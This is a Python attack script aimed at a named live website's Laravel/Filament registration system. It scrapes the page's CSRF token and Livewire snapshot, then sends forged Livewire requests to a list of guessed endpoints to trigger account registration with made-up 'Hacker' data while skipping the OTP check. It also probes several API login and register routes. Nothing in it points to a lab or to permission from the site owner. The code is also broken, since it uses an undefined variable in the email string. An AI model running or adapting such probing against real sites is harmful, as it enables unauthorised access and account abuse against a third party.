import requests, re, json, random, string

s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# Get register page
r = s.get('https://caliphempire.bcl.my/register', timeout=15)
csrf = re.search(r'csrf-token" content="([^"]+)"', r.text)
csrf_token = csrf.group(1) if csrf else 'N/A'
print(f'CSRF: {csrf_token[:30]}...')

snap_match = re.search(r'wire:snapshot="([^"]+)"', r.text, re.DOTALL)
if not snap_match:
    print('No Livewire snapshot found')
    exit()

snap_raw = snap_match.group(1).replace('&quot;', '"').replace('&amp;', '&')
snap_data = json.loads(snap_raw)
checksum = snap_data.get('checksum', '')
livewire_id = snap_data.get('memo', {}).get('id', '')

print(f'Livewire ID: {livewire_id}')

# 1. Try different Livewire endpoint patterns
print('\n=== Testing Livewire endpoints ===')
suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
email = f'live{hack}{suffix}@web-library.net'

for endpoint in [
    '/livewire/message/App.Filament.Pages.Auth.Register',
    '/livewire/message/app.Filament.Pages.Auth.Register',
    '/livewire/message/app-filament-pages-auth-register',
    '/livewire/message/register',
    '/livewire/update',
    '/livewire',
]:
    test_payload = {
        'components': [{
            'snapshot': '{"data":{"data":[{"name":"Hacker","email":"' + email + '","phone":"60123456789","company_name":"HackCorp","password":"TestPass789!","passwordConfirmation":"TestPass789!","otp_method":"sms","otp":null},{"s":"arr"}],"showOtpVerification":false,"showRegisterButton":true,"mountedActions":[[],{"s":"arr"}],"defaultAction":null,"defaultActionArguments":null,"defaultActionContext":null,"defaultTableAction":null,"defaultTableActionRecord":null,"defaultTableActionArguments":null,"componentFileAttachments":[[],{"s":"arr"}],"areSchemaStateUpdateHooksDisabledForTesting":false,"discoveredSchemaNames":[["form","content"],{"s":"arr"}]},"memo":{"id":"' + livewire_id + '","name":"App\\\\Filament\\\\Pages\\\\Auth\\\\Register","path":"portal/register","method":"GET","children":[],"scripts":[],"assets":[],"errors":[],"locale":"en","islands":[]},"checksum":"' + checksum + '"}',
            'calls': [{'path': 'callMethod', 'method': 'register', 'params': []}],
            'snapshotFromMount': True
        }]
    }
    r2 = s.post(f'https://caliphempire.bcl.my{endpoint}',
        json=test_payload,
        headers={'X-CSRF-TOKEN': csrf_token, 'X-Livewire': 'true', 'Accept': 'application/json'},
        timeout=10
    )
    print(f'  {endpoint}: {r2.status_code}')
    if r2.status_code != 404:
        print(f'    Response: {r2.text[:300]}')

# 2. Check if there's an API endpoint
print('\n=== API Routes ===')
for path in ['/api/login', '/api/register', '/api/auth/login', '/api/v1/login', '/api/v1/register']:
    r3 = s.post(f'https://caliphempire.bcl.my{path}',
        json={'email': email, 'password': 'TestPass789!'},
        headers={'Accept': 'application/json'},
        timeout=10
    )
    print(f'  {path}: {r3.status_code}')
    if r3.status_code not in [404, 405]:
        print(f'    Response: {r3.text[:200]}')
